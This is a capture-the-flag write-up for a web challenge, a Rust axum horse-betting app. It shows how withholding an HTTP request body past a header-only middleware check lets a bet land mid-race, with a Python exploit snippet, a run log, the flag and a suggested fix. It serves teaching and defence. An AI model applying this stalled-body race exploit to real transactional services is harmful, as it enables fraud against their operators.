---
title: "Hold Your Horses"
ctf: "platypwnies 2026"
date: 2026-11-14
category: web
difficulty: 1
points: n/a
flag_format: "PP{...}"
author: "author"
flags:
 - "PP{h0ld_y0ur_byt3s_n0t_y0ur_h0rs3s::HEWRVNeikRno}"
---

# Hold Your Horses

## Summary

A Rust **axum** horse-racing betting app where a `#[derive(Default)] AppState` lives in a
single `Arc<RwLock<AppState>>`. The only thing stopping you from betting after the race
has started is a `route_layer` middleware (`betting_open`) that checks `timer < 30`
against the **request head**, while the bet body is extracted later by the handler. Withhold
the body, let the race run, then send it — the bet lands **mid-race**, on a horse you can
already see winning.

Why that is guaranteed: the `favorite` horse runs at **2× speed**, so over a race-to-100 the
mid-race leader is deterministically the winner. A win pays `amount*2` after the stake was
already deducted → net `+amount`, i.e. betting your whole balance **doubles** it. Six
all-in wins on the leader take `9 → 576 ≥ 500` → VIP → flag. 6 races, 6 wins, 0 losses.

## Solution / Exploit

### The handout

`web.horseracing.zip` — a Rust axum app (`src/main.rs`, ~210 lines), `current_thread`
Tokio runtime, state in one `Arc<RwLock<AppState>>`.

```
GET / -> static index.html
GET /fonts/* -> embedded woff2
GET /api/state -> PublicState { race_number, timer, horses[16], user_points, user_bet, vip }
POST /api/bet -> bet, wrapped by route_layer(betting_open)
```

`AppState { user_points: 10, ..Default }` at boot; `user_bet: Option<(usize,u64)>`.

### race_loop (one tick per second)

| timer | action |
|---------|--------|
| `== 0` | `race_number += 1`, `horses = [0.0; 16]` |
| `== 30` | `favorite = rand::random_range(0..=15)` |
| `> 30` | every horse `h` gains `base ~ U(0,3)`, **doubled if `h == favorite`**; if any horse `>= 100.0`, `winner = argmax(horses)`, settle the bet, `timer = 0` |

Settlement (`user_bet.take`): a win does `user_points += amount * 2` (the stake was
already subtracted at bet time) → **net `+amount`**; a loss keeps nothing.

### The gate

```rust
async fn betting_open(
 State(state): State<SharedState>,
 request: Request,
 next: Next,
) -> Result<Response, (StatusCode, String)> {
 if state.read.await.timer >= 30 {
 return Err((StatusCode::BAD_REQUEST, "Race already started".to_string));
 }
 Ok(next.run(request).await)
}
```

Applied with `.route_layer(middleware::from_fn_with_state(state.clone, betting_open))`.

### The bug — TOCTOU on the request body

`route_layer` middleware runs **before** the handler's extractors. `betting_open`
validates `timer < 30` against the **request head only**; the handler's
`Json<BetRequest>` extractor reads the **body** later. So:

1. Send the `POST /api/bet` request line + headers (with `Content-Length`) and
 **withhold the body**.
2. The middleware runs, sees `timer < 30`, and passes.
3. The handler blocks inside the `Json` extractor, waiting for the body.
4. The race runs. Poll `GET /api/state` — all 16 horses are visible.
5. Once a decisive leader emerges, send the body — the bet lands **mid-race**, on the
 horse we already know is winning.

Nothing in the handler re-checks the timer; the middleware was the only gate.

### Why the leader always wins

The favorite gains `U(0,3)*2` per tick vs `U(0,3)` for everyone else. Over a race-to-100
that 2× advantage compounds. Simulation (`hh_sim.py`, n = 200,000):

```
P(favorite wins) = 1.0000
P(fired leader == winner | fired, M>=60, margin>=20) = 1.00000
```

So the strategy is deterministic: fire the withheld body the first instant the leader is
`>= 60` with a `>= 20` gap over 2nd (and `<= 90`, leaving several ticks before the race
ends — the threshold is what `hh_sim.py` validates).

### Payoff ladder

Net `+amount` per win ⇒ bet the whole balance ⇒ doubles. Starting from the live
`user_points = 9`:

```
9 -> 18 -> 36 -> 72 -> 144 -> 288 -> 576 (>= 500 => VIP)
```

### Exploit

`hh_exploit.py` — raw `socket` for the stalled-body POST, `urllib` for the
`/api/state` polling loop, a fixed 64-byte space-padded JSON body so `Content-Length`
can be sent up front.

```
python3 hh_exploit.py --control # immediate body mid-race -> HTTP 400 "Race already started"
python3 hh_exploit.py # stalled body -> ACCEPTED, doubles to 576, prints VIP
```

Key routine (abridged):

```python
sock = socket.create_connection((IP, PORT), timeout=15)
sock.sendall(( # HEAD ONLY, body withheld
 f"POST /api/bet HTTP/1.1\r\nHost: {IP}\r\n"
 f"Content-Type: application/json\r\nContent-Length: {BODY_LEN}\r\n"
 f"Connection: close\r\n\r\n").encode)
# ... poll /api/state until order[0] in [60,90] and order[0]-order[1] >= 20 ...
sock.sendall(make_body(fired, stake)) # fire the body -> bet lands mid-race
```

`hh_run.log` (real run):

```
[race 13] timer~51 leader=#10 stake=9 -> ACCEPTED [+] WON 9 -> 18
[race 14] timer~52 leader=#10 stake=18 -> ACCEPTED [+] WON 18 -> 36
[race 15] timer~53 leader=#6 stake=36 -> ACCEPTED [+] WON 36 -> 72
[race 16] timer~51 leader=#12 stake=72 -> ACCEPTED [+] WON 72 -> 144
[race 17] timer~51 leader=#6 stake=144 -> ACCEPTED [+] WON 144 -> 288
[race 18] timer~51 leader=#0 stake=288 -> ACCEPTED [+] WON 288 -> 576
[+] VIP: VIP access granted! Here is your flag: PP{h0ld_y0ur_byt3s_n0t_y0ur_h0rs3s::HEWRVNeikRno}
```

The `--control` mode proves the middleware is the only gate: sending the body immediately
while a race is running returns `HTTP 400: Race already started`.

## Flag(s)

```
PP{h0ld_y0ur_byt3s_n0t_y0ur_h0rs3s::HEWRVNeikRno}
```

## Notes / Pitfalls

- **Instance is VPN-only.** The target (`10.83.0.51:80`) is reachable only over the event
 WireGuard tunnel (`wg-quick up pp2026-vpn`).
- **No in-app reset.** If `user_points` ever reaches 0 there is no recovery: `amount = 0`
 is rejected and `points < amount` blocks every bet, so a *platform* instance reset is
 required. The recorded run started at 9 because one early 1-point bet had already been
 lost — do not burn points before the exploit is ready.
- **Fixed-length body.** The body is right-padded with spaces to a constant 64 bytes so
 `Content-Length` can be advertised before the JSON is known. `Json` tolerates trailing
 whitespace.
- **Fire window matters.** Bet on the leader once it is `>= 60` but still `<= 90`; firing
 too early is less certain, firing after 100 ends the race before the body lands.
- **Root cause & fix.** The gate is enforced at the wrong point in the request lifecycle,
 against a snapshot that goes stale before the bet is applied. Fix: re-validate inside
 `bet` under the same write lock that mutates `user_bet` (or move the check after body
 extraction), so the timer that is checked is the timer that guards the mutation:

 ```rust
 let mut state = state.write.await;
 if state.timer >= 30 { return Err((StatusCode::BAD_REQUEST, "Race already started".into)); }
 ```
